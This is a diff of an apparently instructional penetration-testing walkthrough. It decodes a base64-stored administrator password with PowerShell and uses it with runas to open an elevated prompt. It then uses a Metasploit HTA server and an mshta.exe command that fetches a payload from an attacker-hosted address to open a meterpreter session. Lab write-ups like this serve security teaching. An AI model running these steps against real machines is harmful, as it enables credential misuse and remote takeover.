@@ -1300,9 +1300,7 @@ ssword))
 
 1. `[System.Convert]::FromBase64String(<base64_password>)`: The base64 string is a textual representation of binary data. To retrieve the original password, we first need to decode it into its binary form.  The `System.Convert` .NET class provides methods for data type conversions, and here we use its `FromBase64String` method to convert the base64 string into a byte array, which represents the raw binary data. Since the byte array is not really human-readable, it must be further processed.
 
-2. `[System.Text.Encoding]::UTF8.GetString(<binary_btye_array>)`: To convert the binary data into a readable format, we use the `System.Text.Encoding` .NET class, which handles character encoding and decoding. Specifically, the `UTF8.GetString` method translates the byte array into a UTF-8 encoded string. UTF-8 is a widely used character encoding standard in PowerShell which ensures the decoded string is properly interpreted as human-readable. 
-
-	We can run a command prompt as an administrator user using the `discovered credentials.
+2. `[System.Text.Encoding]::UTF8.GetString(<binary_btye_array>)`: To convert the binary data into a readable format, we use the `System.Text.Encoding` .NET class, which handles character encoding and decoding. Specifically, the `UTF8.GetString` method translates the byte array into a UTF-8 encoded string. UTF-8 is a widely used character encoding standard in PowerShell which ensures the decoded string is properly interpreted as human-readable.  We can run a command prompt instance as an administrator user using the discovered credentials.
 
 ```
 runas.exe /user:administrator cmd
@@ -1322,7 +1320,7 @@ set SRVHOST <attack_ip>
 exploit
 ```
 
-Once the exploit is started, it will generate a host HTA link (e.g., `http://10.10.31.2:8080/Bn75U0NL8ONS.hta`) that a target only needs to visit once which would execute the embedded powershell commands of the HTA payload and establish a meterpreter session. In this case, we can run mshta.exe through the elevated cmd prompt. 
+Once the exploit is started, it will generate a host HTA link (e.g., `http://10.10.31.2:8080/Bn75U0NL8ONS.hta`) that a target only needs to visit once which would execute the embedded powershell commands of the HTA payload and establish a meterpreter session. We can achieve privilege escalation by running mshta.exe through the elevated command prompt.
 
 ```
 mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
